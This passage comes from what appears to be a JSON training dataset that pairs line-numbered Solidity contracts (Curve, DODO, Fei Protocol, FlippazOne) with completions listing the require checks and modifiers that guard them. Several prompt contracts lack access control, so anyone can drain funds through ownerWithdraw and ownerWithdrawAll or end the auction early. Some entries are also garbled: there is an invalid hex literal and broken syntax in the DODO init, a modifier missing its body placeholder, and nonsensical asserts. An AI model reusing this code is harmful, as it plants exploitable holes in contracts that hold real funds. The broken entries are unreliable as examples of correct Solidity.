curve\n691     /// @return individual_ the individual values in the curve\n692     function liquidity() public view returns (uint256 total_, uint256[] memory individual_) {\n693         return ViewLiquidity.viewLiquidity(curve);\n694     }\n695 \n696     /// @notice view the assimilator address for a derivative\n697     /// @return assimilator_ the assimilator address\n698     function assimilator(address _derivative) public view returns (address assimilator_) {\n699         assimilator_ = curve.assimilators[_derivative].addr;\n700     }\n701 }",
        "completion": "189 require(sender != address(0), \"ERC20: transfer from the zero address\");\n190 require(recipient != address(0), \"ERC20: transfer to the zero address\");\n216 require(_owner != address(0), \"ERC20: approve from the zero address\");\n217 require(spender != address(0), \"ERC20: approve to the zero address\");\n266     modifier onlyOwner() {\n           require(msg.sender == owner, \"Curve/caller-is-not-owner\");        \n            _;\n     }\n\n271     modifier nonReentrant() {\n               require(notEntered, \"Curve/re-entered\");\n               notEntered = false;\n                _;\n               notEntered = true;\n          }\n\n278     modifier transactable() {\n              require(!frozen, \"Curve/frozen-only-allowing-proportional-withdraw\");\n               _;\n         }\n\n283     modifier isEmergency() {\n             require(emergency, \"Curve/emergency-only-allowing-emergency-proportional-withdraw\");\n             _;\n        }\n    \n288     modifier isNotEmergency() {\n              require(!emergency, \"Curve/emergency-only-allowing-emergency-proportional-withdraw\");\n             _;\n     }\n\n293     modifier deadline(uint256 _deadline) {\n             require(block.timestamp < _deadline, \"Curve/tx-deadline-passed\");\n              _;\n         }\n \n298     modifier inWhitelistingStage() {\n              require(whitelistingStage, \"Curve/whitelist-stage-stopped\");\n                _;\n           }\n   \n303     modifier notInWhitelistingStage() {\n              require(!whitelistingStage, \"Curve/whitelist-stage-on-going\");\n        }\n  \n308     modifier globallyTransactable() {\n           require(!ICurveFactory(address(curveFactory)).getGlobalFrozenState(), \"Curve/frozen-globally-only-allowing-proportional-withdraw\");\n              _;\n     }\n    \n313     modifier isFlashable() {\n            require(ICurveFactory(address(curveFactory)).getFlashableState(), \"Curve/flashloans-paused\");\n            _;\n   }\n346 onlyOwner\n352  onlyOwner\n382  onlyOwner \n388  onlyOwner\n394  onlyOwner\n400 onlyOwner\n401 require(_newOwner != address(0), \"Curve/new-owner-cannot-be-zeroth-address\");\n421  noDelegateCall isNotEmergency nonReentrant\n431  require(targetAmount_ >= _minTargetAmount, \"Curve/below-min-target-amount\");\n443 globallyTransactable transactable\n460 globallyTransactable transactable noDelegateCall isNotEmergency nonReentrant \n470 require(originAmount_ <= _maxOriginAmount, \"Curve/above-max-origin-amount\");\n482 globallyTransactable transactable\n502 globallyTransactable transactable nonReentrant noDelegateCall\n503 require(amount == 1, \"Curve/invalid-amount\");\n504 require(index <= 473, \"Curve/index-out-of-range\" );\n505 require(isWhitelisted(index, account, amount, merkleProof), \"Curve/not-whitelisted\");\n506 require(msg.sender == account, \"Curve/not-approved-user\");\n529 globallyTransactable\n530 transactable\n531 nonReentrant\n532 noDelegateCall\n533 notInWhitelistingStage\n534 isNotEmergency\n546 globallyTransactable transactable\n560 nonReentrant\n561 noDelegateCall\n574 nonReentrant\n575 noDelegateCall\n576 isNotEmergency\n590 globallyTransactable transactable \n618 nonReentrant noDelegateCall isNotEmergency\n626 nonReentrant noDelegateCall\n635 isFlashable globallyTransactable nonReentrant noDelegateCall transactable isNotEmergency \n638 require(IERC20(derivatives[0]).balanceOf(address(this)) > 0, 'Curve/token0-zero-liquidity-depth');\n639 require(IERC20(derivatives[1]).balanceOf(address(this)) > 0, 'Curve/token1-zero-liquidity-depth');\n655 require(balance0Before.add(fee0) <= balance0After, 'Curve/insufficient-token0-returned');\n656 require(balance1Before.add(fee1) <= balance1After, 'Curve/insufficient-token1-returned');"
    },
    {
        "prompt": "1 contract DODO {\n2     function init(\n3         address maintainer,\n4         address baseTokenAddress,\n5         address quoteTokenAddress,\n6         uint256 lpFeeRate,\n7         uint256 mtFeeRate,\n8         uint256 k,\n9         uint256 i,\n10         bool isOpenTWAP\n11     ) external {\n12         require(baseTokenAddress != quoteTokenAddress, \"BASE_QUOTE_CAN_NOT_BE_SAME\");\n13         _BASE_TOKEN_ = IERC20(baseTokenAddress);\n14         _QUOTE_TOKEN_ = IERC20(quoteTokenAddress);\n15         \n16         require(i > 0 && i <= 10**36); \n17         _I_ = i; \n18        \n19         require(k <= 10**18); \n20         _K_ = k; \n21        \n22         _LP_FEE_RATE_ = lpFeeRate; \n23         _MT_FEE_RATE_MODEL_ = IFeeRateModel(mtFeeRate); \n24         _MAINTAINER_ = maintainer; \n25         \n26         _IS_OPEN_TWAP_ = isOpenTWAP; \n27         if(isOpenTWAP) _BLOCK_TIMESTAMP_LAST_ = uint32(block.timestamp % 2**32); \n28         \n29         string memory connect = \"_\"; \n30         string memory suffix = \"DLP\"; \n31 \n32         name = string(abi.encodePacked(suffix, connect, addressToShortString(address(this)))); \n33         symbol = \"DLP\"; \n34         decimals = _BASE_TOKEN_.decimals(); \n35         \n36         uint256 chainId; \n37         assembly{\n38             chainId := chainid()\n39         }\n40         abi.encode(\n41         0x8b73x3x69bb8fe3e512ecc4cf759cc79239fb179b0ffacaa9a75d522b39400f, \n42         keccak256(name)), \n43         keccak256(\"I\")),\n44         chainId, \n45         address(this)\n46         )\n47  }; \n48 }",
        "completion": "1+ modifier nonReentrant() {\n               require(notEntered, \"Curve/re-entered\");\n               notEntered = false;\n                _;\n               notEntered = true;\n          }\n11 nonReentrant\n12 require(baseTokenAddress != quoteTokenAddress, \"BASE_QUOTE_CAN_NOT_BE_SAME\");\n16 require(i > 0 && i <= 10**36);      \n19 require(k <= 10**18); "
    },
    {
        "prompt": "1 pragma solidity 0.6.9;\n2 pragma experimental ABIEncoderV2;\n3 \n4 import {Types} from \"./lib/Types.sol\";\n5 import {IERC20} from \"./intf/IERC20.sol\";\n6 import {Storage} from \"./impl/Storage.sol\";\n7 import {Trader} from \"./impl/Trader.sol\";\n8 import {LiquidityProvider} from \"./impl/LiquidityProvider.sol\";\n9 import {Admin} from \"./impl/Admin.sol\";\n10 import {DODOLpToken} from \"./impl/DODOLpToken.sol\";\n11 \n12 \n13 /**\n14  * @title DODO\n15  * @author DODO Breeder\n16  *\n17  * @notice Entrance for users\n18  */\n19 contract DODO is Admin, Trader, LiquidityProvider {\n20     function init(\n21         address owner,\n22         address supervisor,\n23         address maintainer,\n24         address baseToken,\n25         address quoteToken,\n26         address oracle,\n27         uint256 lpFeeRate,\n28         uint256 mtFeeRate,\n29         uint256 k,\n30         uint256 gasPriceLimit\n31     ) external {\n32         require(!_INITIALIZED_, \"DODO_INITIALIZED\");\n33         _INITIALIZED_ = true;\n34 \n35         // constructor\n36         _OWNER_ = owner;\n37         emit OwnershipTransferred(address(0), _OWNER_);\n38 \n39         _SUPERVISOR_ = supervisor;\n40         _MAINTAINER_ = maintainer;\n41         _BASE_TOKEN_ = baseToken;\n42         _QUOTE_TOKEN_ = quoteToken;\n43         _ORACLE_ = oracle;\n44 \n45         _DEPOSIT_BASE_ALLOWED_ = false;\n46         _DEPOSIT_QUOTE_ALLOWED_ = false;\n47         _TRADE_ALLOWED_ = false;\n48         _GAS_PRICE_LIMIT_ = gasPriceLimit;\n49 \n50         // Advanced controls are disabled by default\n51         _BUYING_ALLOWED_ = true;\n52         _SELLING_ALLOWED_ = true;\n53         uint256 MAX_INT = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n54         _BASE_BALANCE_LIMIT_ = MAX_INT;\n55         _QUOTE_BALANCE_LIMIT_ = MAX_INT;\n56 \n57         _LP_FEE_RATE_ = lpFeeRate;\n58         _MT_FEE_RATE_ = mtFeeRate;\n59         _K_ = k;\n60         _R_STATUS_ = Types.RStatus.ONE;\n61 \n62         _BASE_CAPITAL_TOKEN_ = address(new DODOLpToken(_BASE_TOKEN_));\n63         _QUOTE_CAPITAL_TOKEN_ = address(new DODOLpToken(_QUOTE_TOKEN_));\n64 \n65         _checkDODOParameters();\n66     }\n67 }",
        "completion": "32 require(!_INITIALIZED_, \"DODO_INITIALIZED\");"
    },
    {
        "prompt": "1 pragma solidity ^0.6.0;\n2 pragma experimental ABIEncoderV2;\n\n3 import \"./BondingCurve.sol\";\n4 import \"../pcv/IPCVDeposit.sol\";\n\n5 /// @title a square root growth bonding curve for purchasing FEI with ETH\n6 /// @author Fei Protocol\n7 contract EthBondingCurve is BondingCurve {\n8     // solhint-disable-next-line var-name-mixedcase\n9     uint256 internal immutable SHIFT; // k shift\n\n10     constructor(\n11         uint256 scale,\n12         address core,\n13         address[] memory pcvDeposits,\n14         uint256[] memory ratios,\n15         address oracle,\n16         uint256 duration,\n17         uint256 incentive\n18     )\n19         public\n20         BondingCurve(\n21             scale,\n22             core,\n23             pcvDeposits,\n24             ratios,\n25             oracle,\n26             duration,\n27             incentive\n28         )\n29     {\n30         SHIFT = scale / 3; // Enforces a .50c starting price per bonding curve formula\n31     }\n\n32     /// @notice purchase FEI for underlying tokens\n33     /// @param to address to receive FEI\n34     /// @param amountIn amount of underlying tokens input\n35     /// @return amountOut amount of FEI received\n36     function purchase(address to, uint256 amountIn)\n37         external\n38         payable\n39         override\n40         postGenesis\n41         whenNotPaused\n42         returns (uint256 amountOut)\n43     {\n44         require(\n45             msg.value == amountIn,\n46             \"Bonding Curve: Sent value does not equal input\"\n47         );\n48         return _purchase(amountIn, to);\n49     }\n\n50     function getTotalPCVHeld() public view override returns (uint256) {\n51         return address(this).balance;\n52     }\n\n53     // Represents the integral solved for upper bound of P(x) = ((k+X)/(k+S))^1/2 * O. Subtracting starting point C\n54     function _getBondingCurveAmountOut(uint256 adjustedAmountIn)\n55         internal\n56         view\n57         override\n58         returns (uint256 amountOut)\n59     {\n60         uint256 shiftTotal = _shift(totalPurchased); // k + C\n61         uint256 shiftTotalCubed = shiftTotal.mul(shiftTotal.mul(shiftTotal));\n62         uint256 radicand =\n63             (adjustedAmountIn.mul(3).mul(_shift(scale).sqrt()) / 2).add(\n64                 shiftTotalCubed.sqrt()\n65             );\n66         return (radicand.cubeRoot() ** 2).sub(shiftTotal); // result - (k + C)\n67     }\n\n68     // Bonding curve formula is sqrt(k+x)/sqrt(k+S)\n69     function _getBondingCurvePriceMultiplier()\n70         internal\n71         view\n72         override\n73         returns (Decimal.D256 memory)\n74     {\n75         return\n76             Decimal.ratio(_shift(totalPurchased).sqrt(), _shift(scale).sqrt());\n77     }\n\n78     function _allocateSingle(uint256 amount, address pcvDeposit)\n79         internal\n80         override\n81     {\n82         IPCVDeposit(pcvDeposit).deposit{value: amount}(amount);\n83     }\n\n84     function _shift(uint256 x) internal view returns (uint256) {\n85         return SHIFT.add(x);\n86     }\n87 }",
        "completion": "44 require(\n             msg.value == amountIn,\n            \"Bonding Curve: Sent value does not equal input\"\n         );"
    },
    {
        "prompt": "1 pragma solidity ^0.6.0;\n2 pragma experimental ABIEncoderV2;\n\n3 import \"@openzeppelin/contracts/utils/Address.sol\";\n4 import \"./UniswapPCVDeposit.sol\";\n\n5 /// @title implementation for an ETH Uniswap LP PCV Deposit\n6 /// @author Fei Protocol\n7 contract EthUniswapPCVDeposit is UniswapPCVDeposit {\n8     using Address for address payable;\n\n9     /// @notice ETH Uniswap PCV Deposit constructor\n10     /// @param _core Fei Core for reference\n11     /// @param _pair Uniswap Pair to deposit to\n12     /// @param _router Uniswap Router\n13     /// @param _oracle oracle for reference\n14     constructor(\n15         address _core,\n16         address _pair,\n17         address _router,\n18         address _oracle\n19     ) public UniswapPCVDeposit(_core, _pair, _router, _oracle) {}\n\n20     receive() external payable {}\n\n21     /// @notice deposit tokens into the PCV allocation\n22     /// @param ethAmount of tokens deposited\n23     function deposit(uint256 ethAmount) external payable override postGenesis whenNotPaused {\n24         require(\n25             ethAmount == msg.value,\n26             \"Bonding Curve: Sent value does not equal input\"\n27         );\n\n28         ethAmount = address(this).balance; // include any ETH dust from prior LP\n\n29         uint256 feiAmount = _getAmountFeiToDeposit(ethAmount);\n\n30         _addLiquidity(ethAmount, feiAmount);\n\n31         _burnFeiHeld(); // burn any FEI dust from LP\n\n32         emit Deposit(msg.sender, ethAmount);\n33     }\n\n34     function _removeLiquidity(uint256 liquidity)\n35         internal\n36         override\n37         returns (uint256)\n38     {\n39         uint256 endOfTime = uint256(-1);\n40         (, uint256 amountWithdrawn) =\n41             router.removeLiquidityETH(\n42                 address(fei()),\n43                 liquidity,\n44                 0,\n45                 0,\n46                 address(this),\n47                 endOfTime\n48             );\n49         return amountWithdrawn;\n50     }\n\n51     function _transferWithdrawn(address to, uint256 amount) internal override {\n52         payable(to).sendValue(amount);\n53     }\n\n54     function _addLiquidity(uint256 ethAmount, uint256 feiAmount) internal {\n55         _mintFei(feiAmount);\n\n56         uint256 endOfTime = uint256(-1);\n57         router.addLiquidityETH{value: ethAmount}(\n58             address(fei()),\n59             feiAmount,\n60             0,\n61             0,\n62             address(this),\n63             endOfTime\n64         );\n65     }\n66 }",
        "completion": "24         require(\n             ethAmount == msg.value,\n             \"Bonding Curve: Sent value does not equal input\"\n         );\n28+ assert(ethAmount <= k*Old(ethAmount)); \n29+ assert(feiAmount <= k*Old(feiAmount)); "
    },
    {
        "prompt": "1 contract FlippazOne is ERC721, ERC721URIStorage, Ownable {\n2     using Counters for Counters.Counter;\n\n3     Counters.Counter private _tokenIdCounter;\n\n4     string  public              baseURI;\n5     address public              proxyRegistryAddress;\n\n6     uint256 public constant     MAX_SUPPLY           = 1;\n7     uint256 public              minBidStep           = 0.25 ether;\n\n8     uint256 public constant     buyNowPrice          = 15 ether;\n9     uint256 public constant     buyNowPriceUntilBid  = 14.75 ether;\n10     uint256 public              buyNowMultiplier     = 20; // 20 = x2\n11     bool    public              boughtNow;\n\n12     uint256 public              auctionDuration      = 24 hours;\n13     bool    public              auctionStarted;\n14     uint256 public              auctionStartTimestamp;\n15     bool    public              auctionEnded;\n16     uint256 public              auctionEndTimestamp;\n\n17     uint256 public              highestBid          = 0.9 ether;\n18     address public              highestBidder;\n19     uint256 public              totalSupply         = 0;\n    \n20     mapping(address => uint) public bids;\n21     mapping(address => bool) public projectProxy;\n\n22     mapping(address => bool) public hasAddressBidded;\n23     address[] bidAdresses;\n24     uint256 totalBidAddresses;\n    \n\n25     constructor() ERC721(\"FlippazOne\", \"FlippazOne\") {\n26         proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;\n27         baseURI = \"ipfs://QmcrAKPLLZhLWDFA6wpiH9QGEz3wsmedZ4TYWM3vGyLPaX\";\n28     }\n\n29     function _baseURI() internal view override returns (string memory) {\n30         return baseURI;\n31     }\n\n32     function editBaseUri(string memory newUri) public onlyOwner{\n33         baseURI = newUri;\n34     }\n    \n35     /* Edit admin functions */\n36     function editBuyNowMultipler(uint256 newMultiplier) public onlyOwner{\n37         buyNowMultiplier = newMultiplier;\n38     }\n\n39     function editMinBidStep(uint256 newMinBidStep) public onlyOwner{\n40         minBidStep = newMinBidStep;\n41     }\n\n42     /// @param newDuration New auction duration in SECONDS\n43     function editDuration(uint256 newDuration) public onlyOwner{\n44         require(auctionStarted, \"Auction has not yet been started\");\n45         auctionEndTimestamp = auctionStartTimestamp + newDuration;\n46         auctionDuration = newDuration;\n47     }\n\n48     function isAuctionActive() public view returns(bool){\n49         if (auctionStarted){\n50             if (!auctionEnded){\n51                 return block.timestamp < auctionEndTimestamp;\n52             }\n53         }\n54         return false;\n55     }\n\n56     function startAuction() public onlyOwner{\n57         require(auctionStarted == false, \"Auction is already started\");\n58         auctionStarted = true;\n59         auctionStartTimestamp = block.timestamp;\n60         auctionEndTimestamp = block.timestamp + auctionDuration;\n61     }\n\n62     function getBidderPaidAmount(address bidder) public view returns(uint256){\n63         return bids[bidder];\n64     }\n\n65     function getBidderByIndex(uint256 bidderIndex) public view returns(address){\n66         return bidAdresses[bidderIndex];\n67     }\n\n    \n68     function bid() public payable {\n69         require(auctionStarted, \"Auction has not yet started\");\n70         require(!auctionEnded, \"Auction has been finished\");\n71         require(!boughtNow, \"Auction has been finished\");\n72         require(block.timestamp < auctionEndTimestamp, \"Auction has been finished\");\n\n73         uint256 newBid = bids[_msgSender()] + msg.value;\n74         require(newBid >= highestBid + minBidStep, \"Bid must be at least 0.25 ETH higher than the highest bid\");\n\n75         bids[_msgSender()] += msg.value;\n76         highestBid = newBid;\n77         highestBidder = _msgSender();\n\n78         if (!hasAddressBidded[_msgSender()]){\n79             hasAddressBidded[_msgSender()] = true;\n80             totalBidAddresses++;\n81             bidAdresses.push(_msgSender());\n82         }\n    \n83     }\n\n84     function isBuyNowActive() public view returns(bool){\n85         if (auctionStarted){\n86             if (!auctionEnded){\n87                 if (!boughtNow){\n88                     if (block.timestamp < auctionEndTimestamp){\n89                             return true;\n90                     }\n91                 }\n92             }\n93         }\n94         return false;\n95     }\n\n96     function getBuyNowPrice() public view returns(uint256){\n97         if (highestBid < buyNowPriceUntilBid){\n98             return buyNowPrice;\n99         } else {\n100             uint256 newBuyNowPrice = highestBid * buyNowMultiplier / 10;\n101             return newBuyNowPrice;\n102         }\n103     }\n\n104     function buyNow() public payable {\n105         require(auctionStarted, \"Auction has not yet started\");\n106         require(!auctionEnded, \"Auction has been finished\");\n107         require(block.timestamp < auctionEndTimestamp, \"Auction has been finished\");\n108         require(!boughtNow, \"Sorry! Somebody already used BUY NOW button\");\n109         uint256 currentBuyPrice = getBuyNowPrice();\n110         require(msg.value == currentBuyPrice - bids[_msgSender()], \"Invalid funds provided\");\n        \n111         highestBid = currentBuyPrice;\n112         highestBidder = _msgSender();\n\n113         uint256 tokenId = _tokenIdCounter.current();\n114         _tokenIdCounter.increment();\n115         _mint(_msgSender(), tokenId);\n116         boughtNow = true;\n117         auctionEnded =  true;\n118         totalSupply = 1;\n119     }\n\n120     function endAuction() public {\n121         require(auctionStarted, \"Auction has not yet started\");\n122         require(!auctionEnded, \"You cannot end the action again\");\n123         require(block.timestamp >= auctionEndTimestamp, \"Auction duration has not yet elapsed\");\n124         uint256 tokenId = _tokenIdCounter.current();\n125         _tokenIdCounter.increment();\n        \n126         if (highestBidder != address(0)){\n127             _safeMint(highestBidder, tokenId);\n128         } else {\n129             _safeMint(owner(), tokenId);\n130         }\n131         totalSupply = 1;\n132         auctionEnded = true;\n133     }\n\n134     function refundBids() public {\n135         require(auctionEnded, \"Please end the auction firstly\");\n136         for (uint256 i = 0; i < totalBidAddresses; i++){\n137             uint256 addressTotalBid = bids[bidAdresses[i]];\n138             if ((addressTotalBid > 0) && (bidAdresses[i] != highestBidder)){\n139                 (bool success, ) = bidAdresses[i].call{value: addressTotalBid}(\"\");\n140                 bids[bidAdresses[i]] = 0;\n141             }\n142         }\n143     }\n\n144     function burn(uint256 tokenId) public { \n145         require(_isApprovedOrOwner(_msgSender(), tokenId), \"Not approved to burn.\");\n146         _burn(tokenId);\n147     }\n\n148     function ownerWithdraw() public  {\n149         require(auctionEnded || block.timestamp > auctionEndTimestamp, \"Cannot withdraw until auction is ended\");\n150         (bool success, ) = owner().call{value: highestBid}(\"\");\n151         require(success, \"Failed to withdraw funds.\");\n152     }\n\n153     function ownerWithdrawTo(address toAddress) public  {\n154         require(auctionEnded || block.timestamp > auctionEndTimestamp, \"Cannot withdraw until auction is ended\");\n155         (bool success, ) = toAddress.call{value: highestBid}(\"\");\n156         require(success, \"Failed to withdraw funds.\");\n157     }\n\n158     function ownerWithdrawAll() public  {\n159         (bool success, ) = owner().call{value: address(this).balance}(\"\");\n160         require(success, \"Failed to withdraw funds.\");\n161     }\n\n162     function ownerWithdrawAllTo(address toAddress) public  {\n163         (bool success, ) = toAddress.call{value: address(this).balance}(\"\");\n164         require(success, \"Failed to withdraw funds.\");\n165     }\n\n166     function bidderWithdraw() public  {\n167         uint256 totalBid = getBidderPaidAmount(_msgSender());\n168         require(totalBid > 0, \"Nothing to withdraw\");\n169         require(highestBidder != _msgSender(), \"You cannot withdraw as your bid is the highest bid\");\n170         (bool success, ) = _msgSender().call{value: totalBid}(\"\");\n171         require(success, \"Failed to withdraw funds.\");\n172         bids[_msgSender()] = 0;\n173     }\n\n174     function _burn(uint256 tokenId) internal override(ERC721, ERC721URIStorage) {\n175         super._burn(tokenId);\n176     }\n\n177     function tokenURI(uint256 tokenId)\n178         public\n179         view\n180         override(ERC721, ERC721URIStorage)\n181         returns (string memory)\n182     {\n183         require(_exists(tokenId), \"Token does not exist\");\n184         return _baseURI();\n185     }\n\n186     function isApprovedForAll(address _owner, address operator) public view override(ERC721) returns (bool) {\n187         OpenSeaProxyRegistry proxyRegistry = OpenSeaProxyRegistry(proxyRegistryAddress);\n188         if (address(proxyRegistry.proxies(_owner)) == operator || projectProxy[operator]) return true;\n189         return super.isApprovedForAll(_owner, operator);\n190     }\n191 }",
        "completion": "105         require(auctionStarted, \"Auction has not yet started\");\n106         require(!auctionEnded, \"Auction has been finished\");\n107         require(block.timestamp < auctionEndTimestamp, \"Auction has been finished\");\n108         require(!boughtNow, \"Sorry! Somebody already used BUY NOW button\");\n110         require(msg.value == currentBuyPrice - bids[_msgSender()], \"Invalid funds provided\");\n121         require(auctionStarted, \"Auction has not yet started\");\n122         require(!auctionEnded, \"You cannot end the action again\");\n123         require(block.timestamp >= auctionEndTimestamp, \"Auction duration has not yet elapsed\");\n124         uint256 tokenId = _tokenIdCounter.current();\n135         require(auctionEnded, \"Please end the auction firstly\");\n145         require(_isApprovedOrOwner(_msgSender(), tokenId), \"Not approved to burn.\");\n149         require(auctionEnded || block.timestamp > auctionEndTimestamp, \"Cannot withdraw until auction is ended\");\n151         require(success, \"Failed to withdraw funds.\");\n154         require(auctionEnded || block.timestamp > auctionEndTimestamp, \"Cannot withdraw until auction is ended\");\n156         require(success, \"Failed to withdraw funds.\");\n160         require(success, \"Failed to withdraw funds.\");\n162         onlyOwner\n164         require(success, \"Failed to withdraw funds.\");\n168         require(totalBid > 0, \"Nothing to withdraw\");\n169         require(highestBidder != _msgSender(), \"You cannot withdraw as your bid is the highest bid\");\n171         require(success, \"Failed to withdraw funds.\");\n183         require(_exists(tokenId), \"Token does not exist\");"
    },
    {
        "prompt": "1 contract FlippazOne is ERC721, ERC721URIStorage, Ownable {\n2     using Counters for Counters.Counter;\n\n3     Counters.Counter private _tokenIdCounter;\n\n4     string  public              baseURI;\n5     address public              proxyRegistryAddress;\n\n6     uint256 public constant     MAX_SUPPLY           = 1;\n7     uint256 public              minBidStep           = 0.25 ether;\n\n8     uint256 public constant     buyNowPrice          = 15 ether;\n9     uint256 public constant     buyNowPriceUntilBid  = 14.75 ether;\n10     uint256 public              buyNowMultiplier     = 20; // 20 = x2\n11     bool    public              boughtNow;\n\n12     uint256 public              auctionDuration      = 24 hours;\n13     bool    public              auctionStarted;\n14     uint256 public              auctionStartTimestamp;\n15     bool    public              auctionEnded;\n16     uint256 public              auctionEndTimestamp;\n\n17     uint256 public              highestBid          = 0.9 ether;\n18     address public              highestBidder;\n19     uint256 public              totalSupply         = 0;\n    \n20     mapping(address => uint) public bids;\n21     mapping(address => bool) public projectProxy;\n\n22     mapping(address => bool) public hasAddressBidded;\n23     address[] bidAdresses;\n24     uint256 totalBidAddresses;\n    \n\n25     constructor() ERC721(\"FlippazOne\", \"FlippazOne\") {\n26         proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;\n27         baseURI = \"ipfs://QmcrAKPLLZhLWDFA6wpiH9QGEz3wsmedZ4TYWM3vGyLPaX\";\n28     }\n\n29     function _baseURI() internal view override returns (string memory) {\n30         return baseURI;\n31     }\n\n32     function editBaseUri(string memory newUri) public onlyOwner{\n33         baseURI = newUri;\n34     }\n    \n35     /* Edit admin functions */\n36     function editBuyNowMultipler(uint256 newMultiplier) public onlyOwner{\n37         buyNowMultiplier = newMultiplier;\n38     }\n\n39     function editMinBidStep(uint256 newMinBidStep) public onlyOwner{\n40         minBidStep = newMinBidStep;\n41     }\n\n42     /// @param newDuration New auction duration in SECONDS\n43     function editDuration(uint256 newDuration) public onlyOwner{\n44         require(auctionStarted, \"Auction has not yet been started\");\n45         auctionEndTimestamp = auctionStartTimestamp + newDuration;\n46         auctionDuration = newDuration;\n47     }\n\n48     function isAuctionActive() public view returns(bool){\n49         if (auctionStarted){\n50             if (!auctionEnded){\n51                 return block.timestamp < auctionEndTimestamp;\n52             }\n53         }\n54         return false;\n55     }\n\n56     function startAuction() public onlyOwner{\n57         require(auctionStarted == false, \"Auction is already started\");\n58         auctionStarted = true;\n59         auctionStartTimestamp = block.timestamp;\n60         auctionEndTimestamp = block.timestamp + auctionDuration;\n61     }\n\n62     function getBidderPaidAmount(address bidder) public view returns(uint256){\n63         return bids[bidder];\n64     }\n\n65     function getBidderByIndex(uint256 bidderIndex) public view returns(address){\n66         return bidAdresses[bidderIndex];\n67     }\n\n    \n68     function bid() public payable {\n69         require(auctionStarted, \"Auction has not yet started\");\n70         require(!auctionEnded, \"Auction has been finished\");\n71         require(!boughtNow, \"Auction has been finished\");\n72         require(block.timestamp < auctionEndTimestamp, \"Auction has been finished\");\n\n73         uint256 newBid = bids[_msgSender()] + msg.value;\n74         require(newBid >= highestBid + minBidStep, \"Bid must be at least 0.25 ETH higher than the highest bid\");\n\n75         bids[_msgSender()] += msg.value;\n76         highestBid = newBid;\n77         highestBidder = _msgSender();\n\n78         if (!hasAddressBidded[_msgSender()]){\n79             hasAddressBidded[_msgSender()] = true;\n80             totalBidAddresses++;\n81             bidAdresses.push(_msgSender());\n82         }\n    \n83     }\n\n84     function isBuyNowActive() public view returns(bool){\n85         if (auctionStarted){\n86             if (!auctionEnded){\n87                 if (!boughtNow){\n88                     if (block.timestamp < auctionEndTimestamp){\n89                             return true;\n90                     }\n91                 }\n92             }\n93         }\n94         return false;\n95     }\n\n96     function getBuyNowPrice() public view returns(uint256){\n97         if (highestBid < buyNowPriceUntilBid){\n98             return buyNowPrice;\n99         } else {\n100             uint256 newBuyNowPrice = highestBid * buyNowMultiplier / 10;\n101             return newBuyNowPrice;\n102         }\n103     }\n\n104     function buyNow() public payable {\n105         uint256 currentBuyPrice = getBuyNowPrice();\n106         require(msg.value == currentBuyPrice - bids[_msgSender()], \"Invalid funds provided\");\n        \n107         highestBid = currentBuyPrice;\n108         highestBidder = _msgSender();\n\n109         uint256 tokenId = _tokenIdCounter.current();\n110         _tokenIdCounter.increment();\n111         _mint(_msgSender(), tokenId);\n112         boughtNow = true;\n113         auctionEnded =  true;\n114         totalSupply = 1;\n115     }\n\n116     function endAuction() public {\n     \n117         uint256 tokenId = _tokenIdCounter.current();\n118         _tokenIdCounter.increment();\n        \n119         if (highestBidder != address(0)){\n120             _safeMint(highestBidder, tokenId);\n121         } else {\n122             _safeMint(owner(), tokenId);\n123         }\n124         totalSupply = 1;\n125         auctionEnded = true;\n126     }\n\n127     function refundBids() public {\n128         for (uint256 i = 0; i < totalBidAddresses; i++){\n129             uint256 addressTotalBid = bids[bidAdresses[i]];\n130             if ((addressTotalBid > 0) && (bidAdresses[i] != highestBidder)){\n131                 (bool success, ) = bidAdresses[i].call{value: addressTotalBid}(\"\");\n132                 bids[bidAdresses[i]] = 0;\n133             }\n134         }\n135     }\n\n136     function burn(uint256 tokenId) public { \n137         require(_isApprovedOrOwner(_msgSender(), tokenId), \"Not approved to burn.\");\n138         _burn(tokenId);\n139     }\n\n140     function ownerWithdraw() public  {       \n141         (bool success, ) = owner().call{value: highestBid}(\"\");\n142         require(success, \"Failed to withdraw funds.\");\n143     }\n\n144     function ownerWithdrawTo(address toAddress) public  {       \n145         (bool success, ) = toAddress.call{value: highestBid}(\"\");\n146         require(success, \"Failed to withdraw funds.\");\n147     }\n\n148     function ownerWithdrawAll() public  {\n149         (bool success, ) = owner().call{value: address(this).balance}(\"\");\n150         require(success, \"Failed to withdraw funds.\");\n151     }\n\n152     function ownerWithdrawAllTo(address toAddress) public onlyOwner {\n153         (bool success, ) = toAddress.call{value: address(this).balance}(\"\");\n154         require(success, \"Failed to withdraw funds.\");\n155     }\n\n156     function bidderWithdraw() public  {\n157         uint256 totalBid = getBidderPaidAmount(_msgSender());\n158         require(totalBid > 0, \"Nothing to withdraw\");\n159         require(highestBidder != _msgSender(), \"You cannot withdraw as your bid is the highest bid\");\n160         (bool success, ) = _msgSender().call{value: totalBid}(\"\");\n161         require(success, \"Failed to withdraw funds.\");\n162         bids[_msgSender()] = 0;\n163     }\n\n164     function _burn(uint256 tokenId) internal override(ERC721, ERC721URIStorage) {\n165         super._burn(tokenId);\n166     }\n\n167     function tokenURI(uint256 tokenId)\n168         public\n169         view\n170         override(ERC721, ERC721URIStorage)\n171         returns (string memory)\n172     {\n173         require(_exists(tokenId), \"Token does not exist\");\n174         return _baseURI();\n175     }\n\n176     function isApprovedForAll(address _owner, address operator) public view override(ERC721) returns (bool) {\n177         OpenSeaProxyRegistry proxyRegistry = OpenSeaProxyRegistry(proxyRegistryAddress);\n178         if (address(proxyRegistry.proxies(_owner)) == operator || projectProxy[operator]) return true;\n179         return super.isApprovedForAll(_owner, operator);\n180     }\n181 }",
